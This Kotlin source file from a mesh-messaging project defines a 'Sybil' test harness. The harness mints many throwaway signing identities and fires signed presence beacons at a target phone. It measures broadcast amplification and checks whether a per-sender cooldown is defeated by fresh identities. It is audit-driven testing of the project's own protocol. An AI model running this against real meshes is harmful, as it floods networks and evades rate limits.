package com.rumor.mesh.node

import com.rumor.mesh.core.block.BlockManager
import com.rumor.mesh.core.crypto.CryptoManager
import com.rumor.mesh.core.data.memory.InMemoryBlockEntryRepository
import com.rumor.mesh.core.data.memory.InMemoryBlocklistEntryRepository
import com.rumor.mesh.core.data.memory.InMemoryContactRepository
import com.rumor.mesh.core.data.memory.InMemoryMessageRepository
import com.rumor.mesh.core.data.memory.InMemoryRouteRepository
import com.rumor.mesh.core.data.memory.InMemorySubscribedBlocklistRepository
import com.rumor.mesh.core.identity.IdentityProvider
import com.rumor.mesh.core.identity.LocalIdentity
import com.rumor.mesh.core.model.MessageType
import com.rumor.mesh.core.model.UserMode
import com.rumor.mesh.core.policy.PermissiveInboxFilter
import com.rumor.mesh.core.protocol.DuplicateFilter
import com.rumor.mesh.core.protocol.GossipEngine
import com.rumor.mesh.core.protocol.MessageStore
import com.rumor.mesh.core.routing.OnlineStatusTracker
import com.rumor.mesh.core.routing.TopologyTracker
import com.rumor.mesh.core.scheduler.Scheduler
import com.rumor.mesh.core.transport.wifidirect.GossipSession
import java.net.InetSocketAddress
import java.net.Socket
import java.util.Base64
import java.util.UUID
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.runBlocking

/**
 * O127 amplification harness (TEST INSTRUMENT — not a product surface).
 *
 * Mints N ephemeral Ed25519 identities and delivers one SELF_PRESENCE beacon
 * from each to a target phone over the real LAN GossipSession path. Each
 * fresh (never-seen) identity is expected to earn exactly one *free* solicited
 * broadcast reply — the audit §18 claim that one cheap forged inbound causes
 * mesh-wide outbound amplification. Count the target's resulting SELF_PRESENCE
 * broadcasts (observed by a real node peer) to measure the amplification curve
 * empirically, and to check whether the PresenceReplyGate 30s cooldown (keyed
 * on senderId) is defeated by minting a fresh senderId each time.
 *
 * Usage: node --sybil <ip:port> [--sybil-count N] [--sybil-delay ms]
 */
class SybilDriver(
    private val targetIp: String,
    private val targetPort: Int,
    private val count: Int,
    private val delayMs: Long,
) {
    fun run() = runBlocking {
        println("SYBIL: firing $count fresh-identity SELF_PRESENCE beacons at $targetIp:$targetPort")
        var delivered = 0
        var gotSolicitReply = 0
        for (i in 1..count) {
            val id = ephemeralIdentity()
            val engine = miniEngine(id)
            // Compose one SELF_PRESENCE from this brand-new identity.
            engine.composeSelfPresence(UserMode.MOBILE)
            // Give the scheduler a tick to enqueue it.
            delay(30)
            val result = runCatching { deliverOne(id, engine) }.getOrNull()
            if (result != null) {
                delivered++
                // Did the phone hand us a SELF_PRESENCE back in-session?
                val replies = result.messagesReceived.count { it.type == MessageType.SELF_PRESENCE }
                if (replies > 0) gotSolicitReply++
                println(
                    "SYBIL[$i/${count}] id=${id.userId.take(8)} sent=${result.messagesSent} " +
                        "recv=${result.messagesReceived.size} presenceBack=$replies",
                )
            } else {
                println("SYBIL[$i/${count}] id=${id.userId.take(8)} — session failed")
            }
            if (delayMs > 0) delay(delayMs)
        }
        println(
            "SYBIL done: delivered=$delivered/$count, in-session presence replies=$gotSolicitReply. " +
                "Watch the observer node's RECV SELF_PRESENCE count for the mesh-wide amplification.",
        )
    }

    private suspend fun deliverOne(id: LocalIdentity, engine: GossipEngine): GossipSession.SessionResult? {
        val socket = Socket()
        socket.connect(InetSocketAddress(targetIp, targetPort), 4000)
        socket.tcpNoDelay = true
        val session = GossipSession(
            socket = socket,
            localUserId = id.userId,
            localPublicKey = Base64.getEncoder().encodeToString(id.publicKeyBytes),
            signer = { bytes -> CryptoManager.sign(bytes, id.privateKeyBytes) },
            knownMessageIds = engine.knownMessageIds(),
            messagesProvider = engine::messagesForExchange,
            messagesByIds = engine::messagesByIds,
            recentOnlineUsers = emptyMap(),
            isInbound = false,
            sessionGate = { _, _ -> true },
            rbsrItemsProvider = engine::rbsrSnapshot,
            supportedFeatures = listOf(GossipSession.RBSR_FEATURE),
        )
        return session.run()
    }

    private fun ephemeralIdentity(): LocalIdentity {
        val pair = CryptoManager.generateEd25519KeyPair()
        return LocalIdentity(
            userId = CryptoManager.publicKeyToUserId(pair.publicKeyBytes),
            deviceId = "sybil-" + UUID.randomUUID(),
            publicKeyBytes = pair.publicKeyBytes,
            privateKeyBytes = pair.privateKeyBytes,
        )
    }

    /** Minimal engine just to compose a correctly-signed SELF_PRESENCE. */
    private fun miniEngine(id: LocalIdentity): GossipEngine {
        val provider = object : IdentityProvider {
            override val identity = kotlinx.coroutines.flow.MutableStateFlow<LocalIdentity?>(id)
            override val isUnlocked = true
        }
        val contactRepo = InMemoryContactRepository()
        val messageRepo = InMemoryMessageRepository()
        val dup = DuplicateFilter()
        return GossipEngine(
            messageStore = MessageStore(messageRepo, contactRepo, dup),
            duplicateFilter = dup,
            identityProvider = provider,
            onlineStatusTracker = OnlineStatusTracker(),
            topologyTracker = TopologyTracker(InMemoryRouteRepository()),
            contactRepo = contactRepo,
            blockManager = BlockManager(
                InMemoryBlockEntryRepository(),
                InMemorySubscribedBlocklistRepository(),
                InMemoryBlocklistEntryRepository(),
            ),
            scheduler = Scheduler(),
            inboxFilter = PermissiveInboxFilter(),
            scope = CoroutineScope(Dispatchers.Default + SupervisorJob()),
        )
    }
}
